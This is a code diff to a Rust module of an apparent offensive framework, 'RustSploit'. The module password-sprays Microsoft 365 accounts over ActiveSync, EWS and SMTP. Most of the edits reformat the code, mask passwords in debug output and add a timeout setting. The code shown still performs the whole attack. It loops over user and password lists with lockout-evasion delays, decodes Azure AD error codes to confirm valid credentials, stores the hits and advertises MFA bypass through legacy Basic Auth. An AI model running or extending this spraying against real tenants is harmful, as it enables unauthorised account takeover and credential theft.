@@ -9,17 +9,16 @@
 //!
 //! For authorized penetration testing only.
 
-use anyhow::{anyhow, Context, Result};
+use anyhow::{Context, Result, anyhow};
+use base64::{Engine as _, engine::general_purpose};
 use colored::*;
 use std::time::Duration;
-use base64::{engine::general_purpose, Engine as _};
 
 use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
 use crate::module_info::{ModuleInfo, ModuleRank};
 use crate::utils::{
-    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range,
+    build_http_client, cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range,
     cfg_prompt_output_file, cfg_prompt_yes_no, load_lines,
-    build_http_client,
 };
 
 // ============================================================================
@@ -86,13 +85,25 @@ impl SprayMode {
 // Spray Result
 // ============================================================================
 
-#[derive(Debug, Clone)]
+#[derive(Clone)]
 struct SprayHit {
     username: String,
     password: String,
     endpoint: String,
     status: u16,
     detail: String,
+}
+
+impl std::fmt::Debug for SprayHit {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("SprayHit")
+            .field("username", &self.username)
+            .field("password", &"***")
+            .field("endpoint", &self.endpoint)
+            .field("status", &self.status)
+            .field("detail", &self.detail)
+            .finish()
+    }
 }
 
 // ============================================================================
@@ -165,7 +176,11 @@ fn credential_is_valid(status: u16, diag: &Option<String>) -> Option<&'static st
         Some("valid credentials — password expired")
     } else if d.contains("50057") {
         Some("valid credentials — account disabled")
-    } else if d.contains("50079") || d.contains("50076") || d.contains("50074") || d.contains("53004") {
+    } else if d.contains("50079")
+        || d.contains("50076")
+        || d.contains("50074")
+        || d.contains("53004")
+    {
         Some("valid credentials — MFA required")
     } else if d.contains("50158") {
         Some("valid credentials — external security challenge (conditional access)")
@@ -198,14 +213,13 @@ fn try_smtp_auth(username: &str, password: &str, timeout_secs: u64) -> Result<bo
     let addr = format!("{}:{}", SMTP_HOST, SMTP_PORT);
     let timeout = Duration::from_secs(timeout_secs);
 
-    let socket_addr = addr
-        .parse::<std::net::SocketAddr>()
-        .or_else(|_| {
-            use std::net::ToSocketAddrs;
-            addr.to_socket_addrs()?
-                .next()
-                .ok_or_else(|| anyhow!("DNS resolution failed for {}", SMTP_HOST))
-        })?;
+    let socket_addr = addr.parse::<std::net::SocketAddr>().or_else(|e| {
+        tracing::debug!("SMTP addr parse failed ({e:#}), falling back to DNS");
+        use std::net::ToSocketAddrs;
+        addr.to_socket_addrs()?
+            .next()
+            .ok_or_else(|| anyhow!("DNS resolution failed for {}", SMTP_HOST))
+    })?;
 
     let stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)?;
     stream.set_read_timeout(Some(timeout))?;
@@ -308,8 +322,12 @@ fn try_smtp_auth(username: &str, password: &str, timeout_secs: u64) -> Result<bo
 
     // 235 = success
     if auth_resp.starts_with("235") {
-        let _ = std::io::Write::write_all(tls_reader.get_mut(), b"QUIT\r\n");
-        let _ = std::io::Write::flush(tls_reader.get_mut());
+        if let Err(e) = std::io::Write::write_all(tls_reader.get_mut(), b"QUIT\r\n") {
+            tracing::debug!("ActiveSync QUIT write failed: {e:#}");
+        }
+        if let Err(e) = std::io::Write::flush(tls_reader.get_mut()) {
+            tracing::debug!("ActiveSync flush failed: {e:#}");
+        }
         return Ok(true);
     }
 
@@ -407,7 +425,7 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
             ),
             data: None,
         });
-        if !ctx.batch_mode {
+        if !crate::utils::is_batch_mode() {
             crate::mprintln!(
                 "{}",
                 format!(
@@ -423,7 +441,8 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
     display_banner();
 
     // --- Configuration prompts ---
-    let users_file = cfg_prompt_existing_file("user_list", "User list file (email addresses)").await?;
+    let users_file =
+        cfg_prompt_existing_file("user_list", "User list file (email addresses)").await?;
     let pass_file = cfg_prompt_existing_file("password_list", "Password list file").await?;
 
     let delay_secs: u64 = cfg_prompt_int_range(
@@ -444,12 +463,8 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
     )
     .await? as usize;
 
-    let mode_str = cfg_prompt_default(
-        "spray_mode",
-        "Spray mode (activesync/ews/smtp/all)",
-        "all",
-    )
-    .await?;
+    let mode_str =
+        cfg_prompt_default("spray_mode", "Spray mode (activesync/ews/smtp/all)", "all").await?;
     let mode = SprayMode::parse(&mode_str);
 
     let output_file = cfg_prompt_output_file(
@@ -460,6 +475,15 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
     .await?;
 
     let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;
+
+    let timeout_secs: u64 = cfg_prompt_int_range(
+        "timeout",
+        "Connection timeout (seconds)",
+        DEFAULT_TIMEOUT_SECS as i64,
+        1,
+        120,
+    )
+    .await? as u64;
 
     // --- Load wordlists ---
     let users = load_lines(&users_file)?;
@@ -486,7 +510,7 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
     crate::mprintln!();
 
     // --- Build HTTP client ---
-    let client = build_http_client(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
+    let client = build_http_client(Duration::from_secs(timeout_secs))
         .context("Failed to build HTTP client")?;
 
     // --- Spray execution ---
@@ -530,9 +554,16 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
             let password = password.clone();
             let mode = mode;
             let verbose = verbose;
+            let timeout_secs = timeout_secs;
 
             let handle = tokio::spawn(async move {
-                let _permit = sem.acquire().await.ok()?;
+                let _permit = match sem.acquire().await {
+                    Ok(p) => p,
+                    Err(e) => {
+                        crate::meprintln!("[!] Semaphore acquire failed (closed?): {}", e);
+                        return None;
+                    }
+                };
                 let mut round_hits: Vec<SprayHit> = Vec::new();
 
                 // --- ActiveSync ---
@@ -579,11 +610,7 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                         }
                         Err(e) => {
                             if verbose {
-                                crate::mprintln!(
-                                    "  [-] {} @ ActiveSync error: {}",
-                                    user,
-                                    e
-                                );
+                                crate::mprintln!("  [-] {} @ ActiveSync error: {}", user, e);
                             }
                         }
                     }
@@ -643,7 +670,7 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                     let user_clone = user.clone();
                     let pass_clone = password.clone();
                     let smtp_result = tokio::task::spawn_blocking(move || {
-                        try_smtp_auth(&user_clone, &pass_clone, DEFAULT_TIMEOUT_SECS)
+                        try_smtp_auth(&user_clone, &pass_clone, timeout_secs)
                     })
                     .await;
 
@@ -654,7 +681,9 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                                 password: password.clone(),
                                 endpoint: "SMTP".to_string(),
                                 status: 235,
-                                detail: "VALID CREDENTIALS - SMTP Auth (no lockout on this protocol)".to_string(),
+                                detail:
+                                    "VALID CREDENTIALS - SMTP Auth (no lockout on this protocol)"
+                                        .to_string(),
                             });
                         }
                         Ok(Ok(false)) => {
@@ -698,7 +727,11 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                     // Store credential
                     let _id = crate::cred_store::store_credential(crate::cred_store::NewCred {
                         host: "outlook.office365.com",
-                        port: if hit.endpoint == "SMTP" { SMTP_PORT } else { 443 },
+                        port: if hit.endpoint == "SMTP" {
+                            SMTP_PORT
+                        } else {
+                            443
+                        },
                         service: &hit.endpoint.to_lowercase(),
                         username: &hit.username,
                         secret: &hit.password,
@@ -725,7 +758,11 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
         if round_idx + 1 < total_rounds && delay_secs > 0 {
             crate::mprintln!(
                 "{}",
-                format!("[*] Waiting {}s before next round (lockout evasion)...", delay_secs).dimmed()
+                format!(
+                    "[*] Waiting {}s before next round (lockout evasion)...",
+                    delay_secs
+                )
+                .dimmed()
             );
             tokio::time::sleep(Duration::from_secs(delay_secs)).await;
         }
@@ -741,7 +778,12 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
 
     if !hits.is_empty() {
         crate::mprintln!();
-        crate::mprintln!("{}", "[!] NOTE: These credentials bypass MFA via legacy Basic Auth!".red().bold());
+        crate::mprintln!(
+            "{}",
+            "[!] NOTE: These credentials bypass MFA via legacy Basic Auth!"
+                .red()
+                .bold()
+        );
         crate::mprintln!(
             "{}",
             "[!] The tenant has Basic Auth enabled on legacy protocols (ActiveSync/EWS/SMTP)."
@@ -805,10 +847,16 @@ fn save_results(hits: &[SprayHit], path: &str) -> Result<()> {
 
     writeln!(file, "# M365 ActiveSync/EWS Password Spray Results")?;
     writeln!(file, "# Generated by RustSploit")?;
-    writeln!(file, "# WARNING: These credentials bypass MFA via legacy Basic Auth")?;
+    writeln!(
+        file,
+        "# WARNING: These credentials bypass MFA via legacy Basic Auth"
+    )?;
     writeln!(file, "# Total: {} valid credentials found", hits.len())?;
     writeln!(file)?;
-    writeln!(file, "# Format: endpoint | username:password | status | detail")?;
+    writeln!(
+        file,
+        "# Format: endpoint | username:password | status | detail"
+    )?;
 
     for hit in hits {
         writeln!(
@@ -826,4 +874,8 @@ fn save_results(hits: &[SprayHit], path: &str) -> Result<()> {
 // Registration
 // ============================================================================
 
-crate::register_native_module!(crate::module::Category::Creds, "creds/generic/m365_activesync_spray", native);
+crate::register_native_module!(
+    crate::module::Category::Creds,
+    "creds/generic/m365_activesync_spray",
+    native
+);
